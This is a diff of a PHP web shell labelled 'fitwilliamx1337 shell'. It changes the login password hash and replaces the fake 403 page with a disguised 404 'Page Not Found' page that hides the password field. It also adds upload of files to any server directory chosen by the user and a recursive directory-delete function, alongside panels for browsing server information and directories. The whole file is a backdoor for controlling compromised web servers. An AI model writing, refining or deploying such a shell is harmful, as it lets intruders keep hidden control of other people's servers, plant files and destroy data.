@@ -1,7 +1,7 @@
 <?php
 session_start();
 
-$correctPasswordHash = '5f4dcc3b5aa765d61d8327deb882cf99'; // password
+$correctPasswordHash = 'b1fbd7e666a56c405c73b4b144d69156'; // sipur
 
 if (isset($_POST['password'])) {
     $enteredPassword = $_POST['password'];
@@ -14,19 +14,73 @@ if (isset($_POST['password'])) {
 
 if (!isset($_SESSION['authenticated'])) {
     echo '
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>403 Forbidden</title><br>
-        </head><body>
-        <h1>403 Forbidden</h1>
-<p>You dont have permission to access this resource.</p>
-<p>Additionally, a 403 Forbidden
-error was encountered while trying to use an ErrorDocument to handle the request.</p>
+    
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>404 Page Not Found</title>
+<style type="text/css">
+
+::selection{ background-color: #E13300; color: white; }
+::moz-selection{ background-color: #E13300; color: white; }
+::webkit-selection{ background-color: #E13300; color: white; }
+
+body {
+	background-color: #fff;
+	margin: 40px;
+	font: 13px/20px "Times New Roman", Times, serif;
+	color: #4F5155;
+}
+
+a {
+	color: #003399;
+	background-color: transparent;
+	font-weight: normal;
+}
+
+h1 {
+	color: #444;
+	background-color: transparent;
+	border-bottom: 1px solid #D0D0D0;
+	font-size: 19px;
+	font-weight: normal;
+	margin: 0 0 14px 0;
+	padding: 14px 15px 10px 15px;
+}
+
+code {
+	font-family: "Times New Roman", Times, serif;
+	font-size: 12px;
+	background-color: #f9f9f9;
+	border: 1px solid #D0D0D0;
+	color: #002166;
+	display: block;
+	margin: 14px 0 14px 0;
+	padding: 12px 10px 12px 10px;
+}
+
+#container {
+	margin: 10px;
+	border: 1px solid #D0D0D0;
+	-webkit-box-shadow: 0 0 8px #D0D0D0;
+}
+
+p {
+	margin: 12px 15px 12px 15px;
+}
+</style>
+</head>
+<body>
+	<div id="container">
+		<h1>404 Page Not Found</h1>
+		<p>The page you requested was not found.</p>	</div>
+</body>
+</html>
+
         <style>
             body {
-                font-family: Arial, sans-serif;
+                font-family: "Times New Roman", Times, serif;
                 background-color: white;
                 color: black;
                 margin: 0;
@@ -42,7 +96,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
                 padding: 10px;
                 border-radius: 5px;
             }
-            .password-form input[type="  "] {
+            .password-form input[type="password"] {
                 background-color: transparent;
                 border: 1px solid white;
                 color: white;
@@ -64,16 +118,53 @@ error was encountered while trying to use an ErrorDocument to handle the request
     </head>
     <body>
         <div class="password-form">
-        <form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>
-            </form>
+        <form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"><input type="submit" value="Submit"></form>
         </div>
     </body>
     </html>
     ';
     exit;
 }
-?>
 
+// FUNGSI UPLOAD YANG DIPERBAIKI - BISA UPLOAD DARI DIRECTORY LAIN
+if (isset($_FILES['file_upload'])) {
+    // Bisa pilih direktori tujuan dari parameter upload_dir
+    $uploadDir = isset($_POST['upload_dir']) && !empty($_POST['upload_dir']) ? $_POST['upload_dir'] : getcwd();
+    
+    // Validasi direktori
+    if (!is_dir($uploadDir)) {
+        $uploadDir = getcwd();
+        echo '<p style="color: orange;">Directory not found, using current directory.</p>';
+    }
+    
+    $fileName = basename($_FILES['file_upload']['name']);
+    $targetPath = rtrim($uploadDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
+    
+    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $targetPath)) {
+        echo '<p style="color: lime;">File uploaded successfully to: ' . htmlspecialchars($uploadDir) . ' - Filename: ' . htmlspecialchars($fileName) . '</p>';
+    } else {
+        $error = "Upload failed. Error code: " . $_FILES['file_upload']['error'];
+        echo '<p style="color: red;">' . $error . '</p>';
+    }
+}
+
+// Fungsi delete directory
+function deleteDirectory($dir) {
+    if (!is_dir($dir)) return false;
+    
+    $files = array_diff(scandir($dir), array('.', '..'));
+    foreach ($files as $file) {
+        $path = $dir . DIRECTORY_SEPARATOR . $file;
+        if (is_dir($path)) {
+            deleteDirectory($path);
+        } else {
+            unlink($path);
+        }
+    }
+    return rmdir($dir);
+}
+?>
+    
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -163,7 +254,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
     </style>
 </head>
 <body>
-    <h1>fitwilliamx1337 shell  |   <a href="https://instagram.com/fitwilliamx1337">> Contact me < </a><br>
+    <h1>fitwilliamx1337 shell  |   <a href="https://instagram.com/fitwilliamx1337">> Contact me < </a></h1>
     <!-- System Information Section -->
     <div class="system-info">
         <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
@@ -225,13 +316,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
             echo 'Detected Drives feature is available only on Windows.';
         }
         ?>
-    <?php
-    $requestedDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
-    if (!is_dir($requestedDir)) {
-        $requestedDir = getcwd();
-    }
-    $currentDir = realpath($requestedDir);
-    ?>
+    </p>
     <h2>Lokasi Directory</h2>
     <div class="directory-path">
         <?php
